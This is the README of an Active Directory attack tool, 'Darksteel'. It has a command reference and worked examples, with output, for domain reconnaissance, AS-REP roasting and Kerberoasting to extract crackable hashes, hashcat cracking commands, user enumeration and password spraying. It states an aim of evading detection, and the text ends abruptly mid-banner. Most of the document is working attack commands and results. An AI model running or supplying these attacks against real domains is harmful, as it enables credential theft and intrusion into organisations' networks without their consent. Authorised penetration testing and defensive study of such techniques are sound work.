# Darksteel
# Introduction
Darksteel is a tool for automated information gathering and exploitation in the domain. In the penetration found that separate collection of information within the domain is tedious, vulnerability exploitation also requires a lot of tools, so the completion of this project to help me solve the problem of tedious collection of information within the domain and vulnerability exploitation problems. This project is completed with the main purpose of circumventing detection, the exploitation of direct attacks on the domain control is not done, because if there is a device will generate a large number of alerts, and subsequently may add the exploitation of bypass detection.
### New Features Demo
The function of querying acl permission can only be used in windows at present.
```
darksteel.exe computerip -dc 192.168.1.1 -domain test.com -file 123.txt
 ____    ______  ____    __  __   ____    ______  ____    ____    __
/\  _`\ /\  _  \/\  _`\ /\ \/\ \ /\  _`\ /\__  _\/\  _`\ /\  _`\ /\ \
\ \ \/\ \ \ \L\ \ \ \L\ \ \ \/'/'\ \,\L\_\/_/\ \/\ \ \L\_\ \ \L\_\ \ \
 \ \ \ \ \ \  __ \ \ ,  /\ \ , <  \/_\__ \  \ \ \ \ \  _\L\ \  _\L\ \ \  _
  \ \ \_\ \ \ \/\ \ \ \\ \\ \ \\`\  /\ \L\ \ \ \ \ \ \ \L\ \ \ \L\ \ \ \L\ \
   \ \____/\ \_\ \_\ \_\ \_\ \_\ \_\\ `\____\ \ \_\ \ \____/\ \____/\ \____/
    \/___/  \/_/\/_/\/_/\/ /\/_/\/_/ \/_____/  \/_/  \/___/  \/___/  \/___/

   v1.0.8

[*] Computer correspondence iP:
        WIN-KQH5FQSIJSH  ————> A: 192.168.1.46
        DESKTOP-AO8D722  ————> A: 192.168.1.121
        

darksteel.exe ldap -dc 192.168.1.1 -domain test.com -user user -pass password(hash) -m sddl
 ____    ______  ____    __  __   ____    ______  ____    ____    __
/\  _`\ /\  _  \/\  _`\ /\ \/\ \ /\  _`\ /\__  _\/\  _`\ /\  _`\ /\ \
\ \ \/\ \ \ \L\ \ \ \L\ \ \ \/'/'\ \,\L\_\/_/\ \/\ \ \L\_\ \ \L\_\ \ \
 \ \ \ \ \ \  __ \ \ ,  /\ \ , <  \/_\__ \  \ \ \ \ \  _\L\ \  _\L\ \ \  _
  \ \ \_\ \ \ \/\ \ \ \\ \\ \ \\`\  /\ \L\ \ \ \ \ \ \ \L\ \ \ \L\ \ \ \L\ \
   \ \____/\ \_\ \_\ \_\ \_\ \_\ \_\\ `\____\ \ \_\ \ \____/\ \____/\ \____/
    \/___/  \/_/\/_/\/_/\/ /\/_/\/_/ \/_____/  \/_/  \/___/  \/___/  \/___/

   v1.0.8

[*] Acl :
        qt 完全控制 ------> ac
        qt 修改密码 ------> zz
        qt01 拥有DCSync权限
```
### Features
```
ldap
When we have a domain password (hash), we can use ldap to gather useful information about the domain, such as spn, delegate, surviving computers, etc.

kerberos
Exploit for kerberos vulnerability

blast
Blast Domain Users

computerip
Batch query the ip of the computer in the domain
```

```
 ____    ______  ____    __  __   ____    ______  ____    ____    __
/\  _`\ /\  _  \/\  _`\ /\ \/\ \ /\  _`\ /\__  _\/\  _`\ /\  _`\ /\ \
\ \ \/\ \ \ \L\ \ \ \L\ \ \ \/'/'\ \,\L\_\/_/\ \/\ \ \L\_\ \ \L\_\ \ \
 \ \ \ \ \ \  __ \ \ ,  /\ \ , <  \/_\__ \  \ \ \ \ \  _\L\ \  _\L\ \ \  _
  \ \ \_\ \ \ \/\ \ \ \\ \\ \ \\`\  /\ \L\ \ \ \ \ \ \ \L\ \ \ \L\ \ \ \L\ \
   \ \____/\ \_\ \_\ \_\ \_\ \_\ \_\\ `\____\ \ \_\ \ \____/\ \____/\ \____/
    \/___/  \/_/\/_/\/_/\/ /\/_/\/_/ \/_____/  \/_/  \/___/  \/___/  \/___/

   v1.0.8

Available Commands:
  darksteel ldap [parameter]
  darksteel kerberos [parameter]
  darksteel blast [parameter]
  darksteel computerip [parameter]

ldap Interact with LDAP server
  -all
        Query all content
  -dc string
        * Please enter the IP of the domain control
  -domain string
        * Please enter the domain name
  -f string
        Customize the field of LDAP
  -fuzz string
        vague query content
  -ldapSizeLimit int
        Query LDAP maximum number (default 0)
  -m string
        user
          Query all users in the domain
        computer
          Query all computers in the domain
        scomputer
          Query survival computer
        dc
          Query all domain controls in the domain
        spn
          Query all SPN in the domain
        ou
          All OU in the query domain
        mssql
          Query all mssql services in the domain
        asreproast
          Query users in the domain who can use as-rep roast
        maq
          Query the value of maq in the domain
        admins
          Query domain admins
        enterprise
          Query enterprise admins
        exchangecomputer
          Query exchange computers
        exchangesystem
          Query Exchange Trusted Subsystem
        exchangeorgmanager
          Query Exchange Organization Management
        trustdomain
          Query Trust Domain
        adminsdholder
          Query the user whose permission is set for AdminSDHolder
        sidhistory
          Query the users who have set SIDHistory
        cacomputer
          Query adcs
        esc1
          Template that is threatened by esc1
        esc2
          Template that is threatened by esc2
        computerip
          Query the ip address of the computer in the domain
        sddl
          Query misconfigured acl
  -n string
        The field to query, you can write multiple
  -o string
        Output file position, default current directory
  -pass string
        * The corresponding password or hash user
  -user string
        * Username in the domain
  -w string
        all
          all delegate information
        uw
          unconstrained delegation information
        cw
          Constraint appointment information
        bw
          Resource-based constraint delegation

kerberos Do some Kerberos stuff
  -dc string
        * Please enter the IP of the domain control
  -domain string
        * Please enter the domain name
  -enctype string
        enctype Encryption type: rc4, aes128 or aes256 (default "rc4")
  -format string
        format Output hash as John the Ripper or Hashcat format (default "hashcat")
  -ldapsizelimit int
        Query LDAP maximum number (default 0)
  -m string
        asreproast
          as-rep roast attack
        kerberoast
          kerberoasting attack
  -o string
        Output file position, default current directory
  -pass string
        * The corresponding password or hash user
  -ticket string
        Using ticket authentication, enter the path of the ticket
  -tuser string
        Enter the user to be utilized
  -user string
        * Username in the domain

blast Blasting Domain User
  -dc string
        * Please enter the IP of the domain control
  -domain string
        * Please enter the domain name
  -m string
        userenum -userfile user.txt
          User enumeration
        passspray -userfile user.txt -pass password
          Password spraying
        blastpass -user username -passfile password.txt
          Single user burst password
        userpass -upfile userpass.txt
          User password combinations explode
  -o string
        Output file position, default current directory
  -pass string
        Password in the domain
  -passfile string
        Password dictionary
  -t int
        Number of burst threads (default 20)
  -upfile string
        The dictionary corresponding to the user name and password is split by:
  -user string
        Username in the domain
  -userfile string
        User dictionary
  -v    Whether a failure message is displayed

computerip Query the ip address of the computer in the domain
  -dc string
        * Please enter the IP of the domain control
  -domain string
        * Please enter the domain name
  -file string
        Query the list of machine's corresponding IP addresses
  -ldapSizeLimit int
        Query LDAP maximum number (default 0)
  -o string
        Output file position, default current directory
  -pass string
        * Password in the domain
  -user string
        * Username in the domain

```
# Usage Examples
## Ldap
##### 1、When we have a domain account password (hash), we can use ldap to collect useful information in the domain, such as spn, delegate, surviving computers and other information to prepare for domain penetration
```
darksteel.exe ldap -domain test.com -dc 192.168.1.1 -user user -pass password(hash) -all
 ____    ______  ____    __  __   ____    ______  ____    ____    __       
/\  _`\ /\  _  \/\  _`\ /\ \/\ \ /\  _`\ /\__  _\/\  _`\ /\  _`\ /\ \      
\ \ \/\ \ \ \L\ \ \ \L\ \ \ \/'/'\ \,\L\_\/_/\ \/\ \ \L\_\ \ \L\_\ \ \    
 \ \ \ \ \ \  __ \ \ ,  /\ \ , <  \/_\__ \  \ \ \ \ \  _\L\ \  _\L\ \ \  _
  \ \ \_\ \ \ \/\ \ \ \\ \\ \ \\`\  /\ \L\ \ \ \ \ \ \ \L\ \ \ \L\ \ \ \L\ \ 
   \ \____/\ \_\ \_\ \_\ \_\ \_\ \_\\ `\____\ \ \_\ \ \____/\ \____/\ \____/  
    \/___/  \/_/\/_/\/_/\/ /\/_/\/_/ \/_____/  \/_/  \/___/  \/___/  \/___/   
    
   v1.0.8


[*] Domain User:
        Administrator
        Guest
        krbtgt
        wanliu
        qt
        zz
        xx
        exchangeuser
        qt01
        ac

[*] Domain Admins:
        CN=wanliu,CN=Users,DC=wanliu1,DC=com
        CN=Administrator,CN=Users,DC=wanliu1,DC=com

[*] AdminSDHolder:
        Administrator
        krbtgt
        wanliu

[*] sIDHistory:
[*] Enterprise Admins:
        CN=Administrator,CN=Users,DC=wanliu1,DC=com

[*] OU :
        Domain Controllers
        Microsoft Exchange Security Groups

[*] Ca Computer:
        wanliu1-WIN-KQH5FQSIJSH-CA

[*] Esc1 vulnerability template:

[*] Esc2 vulnerability template:

[*] MsSql Computer:
        WIN-7UI852PL

[*] Maq Number:
        10

[*] DC Computer:
        WIN-KQH5FQSIJSH

[*] Acl :
        qt 完全控制 ------> ac
        qt 修改密码 ------> zz
        qt01 拥有DCSync权限

[*] Trust Domain:

[*] Domain Computers:
        WIN-KQH5FQSIJSH
        DESKTOP-AO8D722
        DESKTOP-DO7D913
        WIN-7UI852PL
        EXCHANGESERVER

[*] Survival Computer:
        WIN-KQH5FQSIJSH --> Windows Server 2012 R2 Standard
        DESKTOP-AO8D722 --> Windows 10 专业版
        DESKTOP-DO7D913 --> Windows 10 专业版
        WIN-7UI852PL --> Windows Server 2008 R2 Enterprise
        EXCHANGESERVER --> Windows Server 2016 Datacenter

[*] Exchange Servers:
        CN=EXCHANGESERVER,CN=Computers,DC=wanliu1,DC=com

[*] Exchange Trusted Subsystem:
        CN=EXCHANGESERVER,CN=Computers,DC=wanliu1,DC=com

[*] Exchange Organization Management:
        CN=Administrator,CN=Users,DC=wanliu1,DC=com

[*] Asreproast User:
        xx

[*] 非约束委派机器：
        CN=WIN-KQH5FQSIJSH,OU=Domain Controllers,DC=wanliu1,DC=com [WIN-KQH5FQSIJSH]
[*] 非约束委派用户：
        CN=zz,CN=Users,DC=wanliu1,DC=com [zz]
[*] 约束委派机器：
        CN=WIN-7UI852PL,CN=Computers,DC=wanliu1,DC=com [WIN-7UI852PL]
        cifs/WIN-KQH5FQSIJSH.wanliu1.com/wanliu1.com
        cifs/WIN-KQH5FQSIJSH.wanliu1.com
        cifs/WIN-KQH5FQSIJSH
        cifs/WIN-KQH5FQSIJSH.wanliu1.com/WANLIU1
        cifs/WIN-KQH5FQSIJSH/WANLIU1
[*] 约束委派用户：
[*] 基于资源约束委派：
        CN=DESKTOP-AO8D722,CN=Computers,DC=wanliu1,DC=com -> creator  S-1-5-21-3163795713-59934753-1752793692-1106[qt]
        CN=DESKTOP-DO7D913,CN=Computers,DC=wanliu1,DC=com -> creator  S-1-5-21-3163795713-59934753-1752793692-1106[qt]
        CN=WIN-7UI852PL,CN=Computers,DC=wanliu1,DC=com -> creator  S-1-5-21-3163795713-59934753-1752793692-1106[qt]

[*] SPN：CN=xx,CN=Users,DC=wanliu1,DC=com
        cifs/admin

[*] SPN：CN=WIN-KQH5FQSIJSH,OU=Domain Controllers,DC=wanliu1,DC=com
        exchangeAB/WIN-KQH5FQSIJSH
        exchangeAB/WIN-KQH5FQSIJSH.wanliu1.com
        Dfsr-12F9A27C-BF97-4787-9364-D31B6C55EB04/WIN-KQH5FQSIJSH.wanliu1.com
        ldap/WIN-KQH5FQSIJSH.wanliu1.com/ForestDnsZones.wanliu1.com
        ldap/WIN-KQH5FQSIJSH.wanliu1.com/DomainDnsZones.wanliu1.com
        TERMSRV/WIN-KQH5FQSIJSH
        TERMSRV/WIN-KQH5FQSIJSH.wanliu1.com
        DNS/WIN-KQH5FQSIJSH.wanliu1.com
        GC/WIN-KQH5FQSIJSH.wanliu1.com/wanliu1.com
        RestrictedKrbHost/WIN-KQH5FQSIJSH.wanliu1.com
        RestrictedKrbHost/WIN-KQH5FQSIJSH
        RPC/f20db9b6-b740-4670-ab3c-ead6acf58f4f._msdcs.wanliu1.com
        HOST/WIN-KQH5FQSIJSH/WANLIU1
        HOST/WIN-KQH5FQSIJSH.wanliu1.com/WANLIU1
        HOST/WIN-KQH5FQSIJSH
        HOST/WIN-KQH5FQSIJSH.wanliu1.com
        HOST/WIN-KQH5FQSIJSH.wanliu1.com/wanliu1.com
        E3514235-4B06-11D1-AB04-00C04FC2DCD2/f20db9b6-b740-4670-ab3c-ead6acf58f4f/wanliu1.com
        ldap/WIN-KQH5FQSIJSH/WANLIU1
        ldap/f20db9b6-b740-4670-ab3c-ead6acf58f4f._msdcs.wanliu1.com
        ldap/WIN-KQH5FQSIJSH.wanliu1.com/WANLIU1
        ldap/WIN-KQH5FQSIJSH
        ldap/WIN-KQH5FQSIJSH.wanliu1.com
        ldap/WIN-KQH5FQSIJSH.wanliu1.com/wanliu1.com

[*] SPN：CN=EXCHANGESERVER,CN=Computers,DC=wanliu1,DC=com
        IMAP/EXCHANGESERVER
        IMAP/exchangeserver.wanliu1.com
        IMAP4/EXCHANGESERVER
        IMAP4/exchangeserver.wanliu1.com
        POP/EXCHANGESERVER
        POP/exchangeserver.wanliu1.com
        POP3/EXCHANGESERVER
        POP3/exchangeserver.wanliu1.com
        exchangeRFR/EXCHANGESERVER
        exchangeRFR/exchangeserver.wanliu1.com
        exchangeAB/EXCHANGESERVER
        exchangeAB/exchangeserver.wanliu1.com
        exchangeMDB/EXCHANGESERVER
        exchangeMDB/exchangeserver.wanliu1.com
        SMTP/EXCHANGESERVER
        SMTP/exchangeserver.wanliu1.com
        SmtpSvc/EXCHANGESERVER
        SmtpSvc/exchangeserver.wanliu1.com
        TERMSRV/EXCHANGESERVER
        TERMSRV/exchangeserver.wanliu1.com
        WSMAN/exchangeserver
        WSMAN/exchangeserver.wanliu1.com
        RestrictedKrbHost/EXCHANGESERVER
        HOST/EXCHANGESERVER
        RestrictedKrbHost/exchangeserver.wanliu1.com
        HOST/exchangeserver.wanliu1.com

[*] SPN：CN=DESKTOP-AO8D722,CN=Computers,DC=wanliu1,DC=com
        TERMSRV/DESKTOP-AO8D722
        TERMSRV/DESKTOP-AO8D722.wanliu1.com
        RestrictedKrbHost/DESKTOP-AO8D722
        HOST/DESKTOP-AO8D722
        RestrictedKrbHost/DESKTOP-AO8D722.wanliu1.com
        HOST/DESKTOP-AO8D722.wanliu1.com

[*] SPN：CN=DESKTOP-DO7D913,CN=Computers,DC=wanliu1,DC=com
        TERMSRV/DESKTOP-DO7D913
        TERMSRV/DESKTOP-DO7D913.wanliu1.com
        RestrictedKrbHost/DESKTOP-DO7D913
        HOST/DESKTOP-DO7D913
        RestrictedKrbHost/DESKTOP-DO7D913.wanliu1.com
        HOST/DESKTOP-DO7D913.wanliu1.com

[*] SPN：CN=WIN-7UI852PL,CN=Computers,DC=wanliu1,DC=com
        WSMAN/WIN-7UI852PL
        WSMAN/WIN-7UI852PL.wanliu1.com
        TERMSRV/WIN-7UI852PL
        TERMSRV/WIN-7UI852PL.wanliu1.com
        MSSQLSvc/WIN-7UI852PL.wanliu1.com:1433
        MSSQLSvc/WIN-7UI852PL.wanliu1.com
        RestrictedKrbHost/WIN-7UI852PL
        HOST/WIN-7UI852PL
        RestrictedKrbHost/WIN-7UI852PL.wanliu1.com
        HOST/WIN-7UI852PL.wanliu1.com

[*] SPN：CN=krbtgt,CN=Users,DC=wanliu1,DC=com
        kadmin/changepw

[*] SPN：CN=zz,CN=Users,DC=wanliu1,DC=com
        mssql/DESKTOP-AO8D722
```

##### 2、When we want to find out which user or computer corresponds to certain keywords in the domain, we can use the keyword query to find out which are the administrative users and administrative computers
```
darksteel.exe ldap -domain test.com -dc 192.168.1.1 -user user -pass password(hash) -fuzz 管理员
 ____    ______  ____    __  __   ____    ______  ____    ____    __       
/\  _`\ /\  _  \/\  _`\ /\ \/\ \ /\  _`\ /\__  _\/\  _`\ /\  _`\ /\ \      
\ \ \/\ \ \ \L\ \ \ \L\ \ \ \/'/'\ \,\L\_\/_/\ \/\ \ \L\_\ \ \L\_\ \ \    
 \ \ \ \ \ \  __ \ \ ,  /\ \ , <  \/_\__ \  \ \ \ \ \  _\L\ \  _\L\ \ \  _
  \ \ \_\ \ \ \/\ \ \ \\ \\ \ \\`\  /\ \L\ \ \ \ \ \ \ \L\ \ \ \L\ \ \ \L\ \ 
   \ \____/\ \_\ \_\ \_\ \_\ \_\ \_\\ `\____\ \ \_\ \ \____/\ \____/\ \____/  
    \/___/  \/_/\/_/\/_/\/ /\/_/\/_/ \/_____/  \/_/  \/___/  \/___/  \/___/   
    
   v1.0.8

[*] CN=Administrators,CN=Builtin,DC=test,DC=com   --> 管理员对计算机/域有不受限制的完全访问权
[*] CN=Schema Admins,CN=Users,DC=test,DC=com   --> 架构的指定系统管理员
[*] CN=Enterprise Admins,CN=Users,DC=test,DC=com   --> 企业的指定系统管理员
[*] CN=Domain Admins,CN=Users,DC=test,DC=com   --> 指定的域管理员
[*] CN=zz,CN=Users,DC=test,DC=com   --> 假管理员
```

##### 3、If the content you want to query is not written in the tool you can also use the ldap syntax to query
```
darksteel.exe ldap -domain test.com -dc 192.168.1.1 -user user -pass password(hash) -f "(objectClass=Computer)" -n cn,dNSHostName
 ____    ______  ____    __  __   ____    ______  ____    ____    __       
/\  _`\ /\  _  \/\  _`\ /\ \/\ \ /\  _`\ /\__  _\/\  _`\ /\  _`\ /\ \      
\ \ \/\ \ \ \L\ \ \ \L\ \ \ \/'/'\ \,\L\_\/_/\ \/\ \ \L\_\ \ \L\_\ \ \    
 \ \ \ \ \ \  __ \ \ ,  /\ \ , <  \/_\__ \  \ \ \ \ \  _\L\ \  _\L\ \ \  _
  \ \ \_\ \ \ \/\ \ \ \\ \\ \ \\`\  /\ \L\ \ \ \ \ \ \ \L\ \ \ \L\ \ \ \L\ \ 
   \ \____/\ \_\ \_\ \_\ \_\ \_\ \_\\ `\____\ \ \_\ \ \____/\ \____/\ \____/  
    \/___/  \/_/\/_/\/_/\/ /\/_/\/_/ \/_____/  \/_/  \/___/  \/___/  \/___/   
    
   v1.0.8

DN: CN=WIN-KQH5FQSIJSH,OU=Domain Controllers,DC=test,DC=com
cn: [WIN-KQH5FQSIJSH]
dNSHostName: [WIN-KQH5FQSIJSH.test.com]
DN: CN=DESKTOP-AO8D722,CN=Computers,DC=test,DC=com
cn: [DESKTOP-AO8D722]
dNSHostName: [DESKTOP-AO8D722.test.com]
DN: CN=DESKTOP-DO7D913,CN=Computers,DC=test,DC=com
cn: [DESKTOP-DO7D913]
dNSHostName: [DESKTOP-DO7D913.test.com]
DN: CN=WIN-7UI852PL,CN=Computers,DC=test,DC=com
cn: [WIN-7UI852PL]
dNSHostName: [WIN-7UI852PL.test.com]
```
## Kerberos

##### 1、Use kerberos does not require domain authentication to obtain the user key, you can choose to output hashcat or john blast format (default is hashcat) blast out the password is the user's password, if you do not specify the target user will need a domain user account password for ldap query and output all available keys. hashcat Blast command ：hashcat -m 18200 hash.txt pass.txt --force

```
darksteel.exe kerberos -m asreproast -dc 192.168.1.1 -domain test.com -user user -pass password(hash)
 ____    ______  ____    __  __   ____    ______  ____    ____    __       
/\  _`\ /\  _  \/\  _`\ /\ \/\ \ /\  _`\ /\__  _\/\  _`\ /\  _`\ /\ \      
\ \ \/\ \ \ \L\ \ \ \L\ \ \ \/'/'\ \,\L\_\/_/\ \/\ \ \L\_\ \ \L\_\ \ \    
 \ \ \ \ \ \  __ \ \ ,  /\ \ , <  \/_\__ \  \ \ \ \ \  _\L\ \  _\L\ \ \  _
  \ \ \_\ \ \ \/\ \ \ \\ \\ \ \\`\  /\ \L\ \ \ \ \ \ \ \L\ \ \ \L\ \ \ \L\ \ 
   \ \____/\ \_\ \_\ \_\ \_\ \_\ \_\\ `\____\ \ \_\ \ \____/\ \____/\ \____/  
    \/___/  \/_/\/_/\/_/\/ /\/_/\/_/ \/_____/  \/_/  \/___/  \/___/  \/___/   
    
   v1.0.8

[*] Target domain: test.com (192.168.1.1)
[*] Use LDAP to retreive vulnerable accounts
[*] Ask AS-Rep for user zz without pre-authentication
[*] Get a valid ticket with encryption: arcfour-hmac-md5
[*] Hashes:
$krb5asrep$23$zz@test.COM:8193197b866da1209af56fd5f4610c38$bc8ee9135bd82f0b2333
af24ae376bb014cd0400ef9b8ff0d0dbc8180c671cc6fe1290cd2c876f84352126bd7948adbc6b3f
51d85ebe1e8dfa15c53443fb835d743ce3cd3e5ac7f2549271385134bc685ffe55bdb30103cf132a
69267d9cec9201f478547892b3343c7427b83a901f6c01d877a4357d14d0384cd8b3cf2940e6e32e
a862d700499c6a7791e4fd17228a9adc5db5ebbe6e69d59bcde7f7e3fd3751ba54eda6339cb87b69
5a7a5daf5964a0e626129e8acc9b783aed7c060a4044d41f02da52bcff466a32dc465de10cc7e90c
7c5b84fcac701107da4300db4cfc36d58cc0524f23b5e16789656

```

##### 2、Specify the target user, then domain user authentication is not required

```
darksteel.exe kerberos  -m asreproast -dc 192.168.1.1 -domain test.com -tuser zz
 ____    ______  ____    __  __   ____    ______  ____    ____    __       
/\  _`\ /\  _  \/\  _`\ /\ \/\ \ /\  _`\ /\__  _\/\  _`\ /\  _`\ /\ \      
\ \ \/\ \ \ \L\ \ \ \L\ \ \ \/'/'\ \,\L\_\/_/\ \/\ \ \L\_\ \ \L\_\ \ \    
 \ \ \ \ \ \  __ \ \ ,  /\ \ , <  \/_\__ \  \ \ \ \ \  _\L\ \  _\L\ \ \  _
  \ \ \_\ \ \ \/\ \ \ \\ \\ \ \\`\  /\ \L\ \ \ \ \ \ \ \L\ \ \ \L\ \ \ \L\ \ 
   \ \____/\ \_\ \_\ \_\ \_\ \_\ \_\\ `\____\ \ \_\ \ \____/\ \____/\ \____/  
    \/___/  \/_/\/_/\/_/\/ /\/_/\/_/ \/_____/  \/_/  \/___/  \/___/  \/___/   
    
   v1.0.8

[*] Target domain: test.com (192.168.1.1)
[*] Ask AS-Rep for user zz without pre-authentication
[*] Get a valid ticket with encryption: arcfour-hmac-md5
[*] Hashes:
$krb5asrep$23$zz@test.COM:8193197b866da1209af56fd5f4610c38$bc8ee9135bd82f0b2333
af24ae376bb014cd0400ef9b8ff0d0dbc8180c671cc6fe1290cd2c876f84352126bd7948adbc6b3f
51d85ebe1e8dfa15c53443fb835d743ce3cd3e5ac7f2549271385134bc685ffe55bdb30103cf132a
69267d9cec9201f478547892b3343c7427b83a901f6c01d877a4357d14d0384cd8b3cf2940e6e32e
a862d700499c6a7791e4fd17228a9adc5db5ebbe6e69d59bcde7f7e3fd3751ba54eda6339cb87b69
5a7a5daf5964a0e626129e8acc9b783aed7c060a4044d41f02da52bcff466a32dc465de10cc7e90c
7c5b84fcac701107da4300db4cfc36d58cc0524f23b5e16789656
```

##### 3、If the target will be set after the user spn, the key can be output, you can choose to output hashcat or john blast format (default is hashcat) blast out the password is the user's password, if you do not specify the target user will need a domain user account password for ldap query and output all available keys. hashcat Blast command ：hashcat -m 13100 hash.txt pass.txt --force

```
darksteel.exe kerberos -m kerberoast -dc 192.168.1.1 -domain test.com -user user -pass password(hash) 
 ____    ______  ____    __  __   ____    ______  ____    ____    __       
/\  _`\ /\  _  \/\  _`\ /\ \/\ \ /\  _`\ /\__  _\/\  _`\ /\  _`\ /\ \      
\ \ \/\ \ \ \L\ \ \ \L\ \ \ \/'/'\ \,\L\_\/_/\ \/\ \ \L\_\ \ \L\_\ \ \    
 \ \ \ \ \ \  __ \ \ ,  /\ \ , <  \/_\__ \  \ \ \ \ \  _\L\ \  _\L\ \ \  _
  \ \ \_\ \ \ \/\ \ \ \\ \\ \ \\`\  /\ \L\ \ \ \ \ \ \ \L\ \ \ \L\ \ \ \L\ \ 
   \ \____/\ \_\ \_\ \_\ \_\ \_\ \_\\ `\____\ \ \_\ \ \____/\ \____/\ \____/  
    \/___/  \/_/\/_/\/_/\/ /\/_/\/_/ \/_____/  \/_/  \/___/  \/___/  \/___/   
    
   v1.0.8


[*] Target domain: test.com (192.168.1.1)
[*] Use username and password/key as credentials to request a TGT
[*] Use LDAP to retreive vulnerable accounts
[*] Found 1 users to Kerberoast found in LDAP
[*] CN=zz,CN=Users,DC=test,DC=com
    sAMAccountName      : zz
    distinguishedName   : CN=zz,CN=Users,DC=test,DC=com
    servicePrincipalName: mssql/DESKTOP-AO8D722
[*] Asking TGS for principal: zz
[*] Hashes:
$krb5tgs$23$*zz$WANLIU1.COM$zz*$c1c2da2dbd793dbe2f627132f992e3a7$a3f77d350104545
3a8ab2917a0961d3ca54f4e97610d00ee5cb3ac03dbc84a9831d4bbd007d143619de8ca277e36c97
7f5e672396750350a14916b5dece2daa279e47f7684b03d044e9e748f5f3ce777efe73e4df64d814
75dd1217784fe78fabe7195f5dc659520081152c045574200bfe68aad97cc6c529c3d6e57eefbbaa
f270fdcee23445ce160b4c71346753fd8464aa5e6073b8b0c9d6e3865a4f48dc61d05f9a97a4d0a5
6caf0ad0059e058e4746e260d2905e429e31ed7655c87fghtf5654f54c9e506d3b737f678f9fd2bd
68c226e61f852a6c1e35ceb3b1f6f3c78f1160ddb4ea290870eff55f4ba6ca0161a5bf5545a8da59
fe20610aafa91fbbe7b8e8f3ff715f965bd09681aa41b929f98a94f8084fca1cb98f38e718612f1e
51d779c622ae91e0ee62bd2a809b59e0031f57c2647b8ef15972015f3669a80d489139153d20312b
c8f9be5252fc6ed6dd78a22dec9458d41e6a940534d33c8ajhhgj5f36d224332fec721874e46fea7
b2397922c6cbe689ef0ff7d0cb1c9d89c975c462a746ae5d473b9cfc37fadcecc96a3907980a13b9
28cd053467090458ab0a8995e1237cef641698172d6537c2ef4e5987726d6a007b03ffec867f3ab8
5fd1ce7e89f6bc694266c61ca74e6af2200bfa3a90313bbda3282ed267e6f59d477e789e4c454f66
ac942df4461fc2bad317e23176e8cc299261c1c947dca068153b2fab47b018b2e82ba08d20078195
8149dd3b03c27ec17bee22496c7cccb3e6acd23c6e7bce62658f7274ce3eef06aa16d4c94bbfbe42
3f9e7b7254625d28c27fbf2bc07aeec63f7ebe25b49742346eea44e61478e212d719be9c98a53a1c
2657790c02654fa1c9caf5bdbb816cece4e6ce6e48c86323a8596f059b9d4e4856d52480f56272a5
a393473eaf0ab12b3e085aa97ee28311c4cd54797229522001a3e5fd5fdefgrg4e03efe691635448
392ea8275cb0916bcc205fb2376ae60008a24cdea072069ca4710d9290d77bab830cf96c97c31fb0
bab707802409efbad0bb30c6efe207c75632225a52ec757f878e8d97647c34d6703e2a94f2701739
9ba6efd18a4f714b63468810929287ca3359fff00632ab5de545667d39d6e77456c1b7df57d400a7
ec9ad23b0fc93f24f9c151d9509aeabfbb298a02865bd5d16a273fc6ffb8df14456e0b2eaf973653
895e7f51f73606294845d6a9ccab6a68b5774a706f06a692c4b619e50ac35fa48e1aadb6323c279f
68e4c6d29462bd82371a0f24744cbb43bf4ca3a6cca165fe4b4025a4b69a2208bd16eacb0a029973
86bff57b4fa0924713d7b32295096ac7cc7942299a0b5126880c768edcb7743a429ded7323941cdd
c6293d7962553c7423b465d9c1c9aae98cf14e30ff0f21e8d75275a48dc1fac5bb37987057e74f83
f7aeb47dc601826d6643f95c33c7d388a3120b08ed2864e0c0bdacfb41594cea5d286583ed2fd520
89857642a160760dca1cea4
```
## blast
##### 1、When we find a domain but no domain user yet, we can use the domain user enumeration to enumerate domain users. To output a failure message you can use the -v parameter

```
darksteel.exe blast -m userenum -dc 192.168.1.1 -domain test.com -userfile users.txt
 ____    ______  ____    __  __   ____    ______  ____    ____    __       
/\  _`\ /\  _  \/\  _`\ /\ \/\ \ /\  _`\ /\__  _\/\  _`\ /\  _`\ /\ \      
\ \ \/\ \ \ \L\ \ \ \L\ \ \ \/'/'\ \,\L\_\/_/\ \/\ \ \L\_\ \ \L\_\ \ \    
 \ \ \ \ \ \  __ \ \ ,  /\ \ , <  \/_\__ \  \ \ \ \ \  _\L\ \  _\L\ \ \  _
  \ \ \_\ \ \ \/\ \ \ \\ \\ \ \\`\  /\ \L\ \ \ \ \ \ \ \L\ \ \ \L\ \ \ \L\ \ 
   \ \____/\ \_\ \_\ \_\ \_\ \_\ \_\\ `\____\ \ \_\ \ \____/\ \____/\ \____/  
    \/___/  \/_/\/_/\/_/\/ /\/_/\/_/ \/_____/  \/_/  \/___/  \/___/  \/___/   
    
   v1.0.8


[+] USERNAME:    zz@test.com
[+] USERNAME:    xx@test.com
Done! Tested logins in 0.034 seconds



darksteel.exe blast -m userenum -dc 192.168.1.1 -domain test.com -userfile users.txt -v
 ____    ______  ____    __  __   ____    ______  ____    ____    __       
/\  _`\ /\  _  \/\  _`\ /\ \/\ \ /\  _`\ /\__  _\/\  _`\ /\  _`\ /\ \      
\ \ \/\ \ \ \L\ \ \ \L\ \ \ \/'/'\ \,\L\_\/_/\ \/\ \ \L\_\ \ \L\_\ \ \    
 \ \ \ \ \ \  __ \ \ ,  /\ \ , <  \/_\__ \  \ \ \ \ \  _\L\ \  _\L\ \ \  _
  \ \ \_\ \ \ \/\ \ \ \\ \\ \ \\`\  /\ \L\ \ \ \ \ \ \ \L\ \ \ \L\ \ \ \L\ \ 
   \ \____/\ \_\ \_\ \_\ \_\ \_\ \_\\ `\____\ \ \_\ \ \____/\ \____/\ \____/  
    \/___/  \/_/\/_/\/_/\/ /\/_/\/_/ \/_____/  \/_/  \/___/  \/___/  \/___/   
    
   v1.0.8


[!] asdfqwadad@test.com - User does not exist
[!] admin@test.com - User does not exist
[+] USERNAME:    zz@test.com
[+] USERNAME:    xx@test.com
Done! Tested logins in 0.002 seconds
```

##### 2、Find the user and use a single password to blast
```
darksteel.exe blast -m passspray -dc 192.168.1.1 -domain test.com -userfile users.txt -pass 123456
 ____    ______  ____    __  __   ____    ______  ____    ____    __       
/\  _`\ /\  _  \/\  _`\ /\ \/\ \ /\  _`\ /\__  _\/\  _`\ /\  _`\ /\ \      
\ \ \/\ \ \ \L\ \ \ \L\ \ \ \/'/'\ \,\L\_\/_/\ \/\ \ \L\_\ \ \L\_\ \ \    
 \ \ \ \ \ \  __ \ \ ,  /\ \ , <  \/_\__ \  \ \ \ \ \  _\L\ \  _\L\ \ \  _
  \ \ \_\ \ \ \/\ \ \ \\ \\ \ \\`\  /\ \L\ \ \ \ \ \ \ \L\ \ \ \L\ \ \ \L\ \ 
